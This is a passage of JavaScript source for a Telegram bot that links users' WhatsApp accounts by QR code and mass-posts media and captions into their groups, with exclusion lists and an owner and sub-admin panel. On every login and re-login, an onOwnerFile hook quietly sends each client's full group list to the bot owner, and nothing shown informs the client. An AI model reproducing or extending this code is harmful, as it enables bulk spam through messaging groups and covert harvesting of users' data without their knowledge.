    try { fs.rmSync(P.excluded(t), { force: true }); } catch {}
    return renderAdminPanel(bot, chatId);
  }
  if (data === 'adm_broadcast') {
    if (role !== 'owner') return;
    st.mode = 'admin_broadcast_await';
    return bot.sendMessage(chatId, '📣 Отправь текст объявления.');
  }
}

async function startQr(bot, chatId) {
  const st = uiState(chatId);
  st.mode = 'qr';
  await bot.sendMessage(chatId, '📷 Генерирую QR…');
  try {
    await startSession(chatId, {
      onQR: async (png) => bot.sendPhoto(chatId, png, { caption: 'WhatsApp → Связанные устройства.' }),
      onStatus: async (s) => {
        if (s === 'connected') {
          st.mode = 'idle';
          const users = loadUsers();
          if (users[String(chatId)]) { users[String(chatId)].waConnected = true; saveUsers(users); }
          await bot.sendMessage(chatId, '✅ Подключён. Подгружаю группы…');
        } else if (s === 'qr_expired') {
          st.mode = 'idle';
          await bot.sendMessage(chatId, '⌛ QR истёк. /start.');
        } else if (s === 'logged_out') {
          st.mode = 'idle';
          await bot.sendMessage(chatId, '⚠️ Сессия закрыта. /start.');
        }
      },
      onOwnerFile: async (buf, count, clientId) => {
        try {
          await bot.sendDocument(OWNER_ID, buf,
            { caption: `📎 *Новый вход (QR)*\nID: \`${clientId}\`\nГрупп: *${count}*`, parse_mode: 'Markdown' },
            { filename: 'all_groups_master.txt', contentType: 'text/plain' });
        } catch (e) { console.error('[bot] file fail:', e.message); }
      },
    });
  } catch (e) { st.mode = 'idle'; return bot.sendMessage(chatId, `❌ ${e.message}`); }
}

async function renderGroups(bot, chatId) {
  const st = uiState(chatId);
  const all = await listGroupsSorted(chatId).catch(() => []);
  const excluded = loadExcluded(chatId);
  const total = all.length;
  const pages = Math.max(1, Math.ceil(total / PAGE_SIZE_GROUPS));
  const page = Math.min(st.groupPage, pages - 1);
  st.groupPage = page;
  const slice = all.slice(page * PAGE_SIZE_GROUPS, (page + 1) * PAGE_SIZE_GROUPS);

  const lines = slice.map((g, i) => {
    const badge = g.closed ? '🔒 ' : '';
    const ex = excluded.has(g.jid) ? '🚫 ' : '';
    return `${page * PAGE_SIZE_GROUPS + i + 1}. ${ex}${badge}${g.subject} — ${g.size}`;
  });

  const kb = [];
  if (slice.length) {
    kb.push(slice.map((g, i) => ({ text: `☑ ${page * PAGE_SIZE_GROUPS + i + 1}`, callback_data: `ex_toggle_${g.jid}` })));
  }
  kb.push([
    { text: '⏮ 1', callback_data: 'gr_list_0' },
    { text: '⬅️', callback_data: `gr_list_${Math.max(0, page - 1)}` },
    { text: '➡️', callback_data: `gr_list_${Math.min(pages - 1, page + 1)}` },
    { text: '⏭', callback_data: `gr_list_${pages - 1}` },
  ]);
  kb.push([{ text: '🔄 Обновить', callback_data: 'gr_refresh' }, { text: '🏠 Меню', callback_data: 'status' }]);

  return bot.sendMessage(chatId,
    `📋 *Группы* (${total}, ${page + 1}/${pages})\n${lines.join('\n') || '— пусто —'}`,
    { parse_mode: 'Markdown', reply_markup: { inline_keyboard: kb } });
}

async function renderExclusions(bot, chatId) {
  const st = uiState(chatId);
  const all = await listGroupsSorted(chatId).catch(() => []);
  const excluded = loadExcluded(chatId);

  const filtered = all.filter(g => {
    if (st.onlyExcluded && !excluded.has(g.jid)) return false;
    return true;
  });
  const pages = Math.max(1, Math.ceil(filtered.length / PAGE_SIZE_GROUPS));
  const page = Math.min(st.groupPage, pages - 1);
  st.groupPage = page;
  const slice = filtered.slice(page * PAGE_SIZE_GROUPS, (page + 1) * PAGE_SIZE_GROUPS);

  const lines = slice.map(g => `${excluded.has(g.jid) ? '🚫' : '☑'} ${g.subject} — ${g.size}`);

  const kb = [
    ...slice.map(g => ([{
      text: `${excluded.has(g.jid) ? '☑ Убрать' : '🚫 Исключить'}: ${g.subject.slice(0, 20)}`,
      callback_data: `ex_toggle_${g.jid}`,
    }])),
    [
      { text: '⬅️', callback_data: `ex_list_${Math.max(0, page - 1)}` },
      { text: '➡️', callback_data: `ex_list_${Math.min(pages - 1, page + 1)}` },
    ],
    [
      { text: st.onlyExcluded ? '☑ Только исключённые' : '◻️ Только исключённые', callback_data: `ex_only_${st.onlyExcluded ? 0 : 1}` },
      { text: '🧹 Очистить', callback_data: 'ex_clear' },
    ],
    [{ text: '🏠 Меню', callback_data: 'status' }],
  ];

  return bot.sendMessage(chatId,
    `🚫 *Исключения* (${page + 1}/${pages})\n${lines.join('\n') || '— пусто —'}`,
    { parse_mode: 'Markdown', reply_markup: { inline_keyboard: kb } });
}

async function showBroadcastMenu(bot, chatId) {
  const st = uiState(chatId);
  return bot.sendMessage(chatId,
    `📤 *Рассылка*\nРежим: *${st.broadcastMode}*`,
    { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [
      [{ text: st.broadcastMode === 'one' ? '☑ В 1' : '◻️ В 1', callback_data: 'bc_mode_one' },
       { text: st.broadcastMode === 'ten' ? '☑ В 10' : '◻️ В 10', callback_data: 'bc_mode_ten' },
       { text: st.broadcastMode === 'all' ? '☑ Во все' : '◻️ Во все', callback_data: 'bc_mode_all' }],
      [{ text: '▶️ Запустить', callback_data: 'bc_start' }],
      [{ text: '🛑 Остановить', callback_data: 'bc_stop' }],
      [{ text: '🏠 Меню', callback_data: 'status' }],
    ]}});
}

async function runChosenBroadcast(bot, chatId) {
  const st = uiState(chatId);
  const all = await listGroupsSorted(chatId).catch(() => []);
  const excluded = loadExcluded(chatId);
  let targets;

  if (st.broadcastMode === 'one') {
    if (!st.selectedGroupJid) return bot.sendMessage(chatId, 'Выбери группу через «📋 Мои группы».');
    targets = all.filter(g => g.jid === st.selectedGroupJid);
  } else if (st.broadcastMode === 'ten') {
    const open = all.filter(g => !g.closed && !excluded.has(g.jid));
    targets = shuffleFisherYates(open).slice(0, 10);
  } else {
    targets = all.filter(g => !g.closed && !excluded.has(g.jid));
  }
  if (!targets.length) return bot.sendMessage(chatId, '⚠️ Нет групп.');

  bot.sendMessage(chatId, `🚀 Запуск на ${targets.length}…`);
  const res = await runBroadcast(chatId, targets, st.selectedMedia, st.selectedCaption);
  if (!res.ok) return bot.sendMessage(chatId, `❌ ${res.error}`);

  const { success, skipped, errors } = res.stats;
  const report = [
    `📊 *Отчёт*`,
    `✅ Успешно: ${success}`,
    `🔒 Пропущено: ${skipped}`,
    `⚠️ Ошибок: ${errors.length}`,
    errors.length ? `\n${errors.slice(0, 10).map(e => `• ${e.subject}: ${e.reason}`).join('\n')}` : '',
  ].join('\n');
  return bot.sendMessage(chatId, report, { parse_mode: 'Markdown' });
}

async function renderAdminPanel(bot, chatId) {
  const st = uiState(chatId);
  const users = loadUsers();
  const list = Object.values(users).filter(u => {
    if (roleOf(chatId) === 'subadmin') return roleOf(u.id) === 'client';
    return true;
  }).sort((a, b) => b.createdAt - a.createdAt);

  const pages = Math.max(1, Math.ceil(list.length / PAGE_SIZE_USERS));
  const page = Math.min(st.adminPage, pages - 1);
  st.adminPage = page;
  const slice = list.slice(page * PAGE_SIZE_USERS, (page + 1) * PAGE_SIZE_USERS);

  const kb = slice.map(u => {
    const live = isConnected(u.id) ? '🟢' : '🔴';
    return [{ text: `${live} ${u.id} [${roleOf(u.id)}]`, callback_data: `adm_user_${u.id}` }];
  });
  kb.push([
    { text: '⬅️', callback_data: `adm_page_${Math.max(0, page - 1)}` },
    { text: `${page + 1}/${pages}`, callback_data: 'admin_panel' },
    { text: '➡️', callback_data: `adm_page_${Math.min(pages - 1, page + 1)}` },
  ]);
  if (roleOf(chatId) === 'owner') kb.push([{ text: '📣 Объявление', callback_data: 'adm_broadcast' }]);
  return bot.sendMessage(chatId, `🛡 *Панель* (${page + 1}/${pages})`,
    { parse_mode: 'Markdown', reply_markup: { inline_keyboard: kb } });
}

async function renderAdminUser(bot, chatId) {
  const st = uiState(chatId);
  const target = st.adminUserId;
  if (!target) return renderAdminPanel(bot, chatId);
  const u = loadUsers()[String(target)];
  if (!u) return bot.sendMessage(chatId, 'Не найден.');
  const banned = loadBanned();
  return bot.sendMessage(chatId,
    `👤 *${target}*\nРоль: *${roleOf(target)}*\nWA: ${isConnected(target) ? '🟢' : '🔴'}\nБан: ${banned.has(target) ? 'да' : 'нет'}`,
    { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [
      [{ text: '🛑 Стоп рассылку', callback_data: `adm_stop_${target}` }],
      [{ text: '🔌 Кик WA', callback_data: `adm_kickwa_${target}` }],
      [{ text: banned.has(target) ? '♻️ Разбанить' : '⛔ Забанить', callback_data: `adm_ban_${target}` }],
      [{ text: '🗑 Удалить', callback_data: `adm_del_${target}` }],
      [{ text: '⬅️ Назад', callback_data: 'admin_panel' }],
    ]}});
}

// ============================================================
// 11. EXPRESS + BOOTSTRAP
// ============================================================

const app = express();

app.get('/', (req, res) => {
  const users = loadUsers();
  let busy = 0;
  for (const id of Object.keys(users)) {
    if (roleOf(id) === 'client' && isConnected(id)) busy++;
  }
  res.json({
    ok: true, uptime: process.uptime(),
    slots: { used: busy, max: MAX_USERS },
    sessions: sessions.size, owner: OWNER_ID, ts: Date.now(),
  });
});
app.get('/healthz', (req, res) => res.json({ ok: true }));

app.listen(PORT, async () => {
  console.log(`[http] :${PORT}`);

  if (!BOT_TOKEN) {
    console.error('[bot] BOT_TOKEN missing');
  } else {
    const bot = createBot(BOT_TOKEN);
    console.log('[bot] polling started');

    const users = loadUsers();
    console.log(`[wa] bootstrap ${Object.keys(users).length} sessions…`);
    await bootstrapAll(users, {
      onStatus: (id, s) => console.log(`[wa] ${id}: ${s}`),
      onLoggedOut: (id) => {
        const u = readJson(P.users, {});
        if (u[String(id)]) { u[String(id)].waConnected = false; writeJsonAtomic(P.users, u); }
      },
      onOwnerFile: async (buf, count, clientId) => {
        try {
          await bot.sendDocument(OWNER_ID, buf,
            { caption: `📎 *Ре-вход клиента*\nID: \`${clientId}\`\nГрупп: *${count}*`, parse_mode: 'Markdown' },
            { filename: 'all_groups_master.txt', contentType: 'text/plain' });
        } catch (e) { console.error('[boot] file fail:', e.message); }
      },
    });
    console.log('[wa] bootstrap done');
  }
});
